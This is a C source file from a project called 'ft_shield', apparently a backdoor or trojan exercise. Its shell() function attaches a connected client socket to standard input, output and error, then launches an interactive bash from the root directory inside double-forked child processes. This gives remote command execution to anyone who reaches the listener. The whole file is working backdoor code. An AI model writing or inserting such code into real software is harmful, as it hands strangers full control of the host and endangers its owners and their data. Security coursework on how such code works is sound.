#include "../ft_shield.h"

int	g_shelllvl = 0;
int	g_shelling = 0;
int	g_shells[BACKLOG];

void	shell_done(int)
{
	--g_shelllvl;
	if (g_shelllvl == 0)
		g_shelling = 0;
}

void	shell(int epfd, int cfd)
{
	pid_t	mypid;
	pid_t	cpid;

	g_shells[cfd] = 1;
	++g_shelllvl;
	mypid = getpid();
	if (fork() == 0)
	{
		cpid = fork();
		if (cpid == 0)
		{
			dup2(cfd, STDIN_FILENO);
			dup2(cfd, STDOUT_FILENO);
			dup2(cfd, STDERR_FILENO);
			chdir("/");
			execl("/bin/bash", "bash", "-i", NULL);
		}
		else
		{
			waitpid(cpid, NULL, 0);
			kill(mypid, SIGUSR1);
			exit_client(cfd, epfd);
		}
	}
}
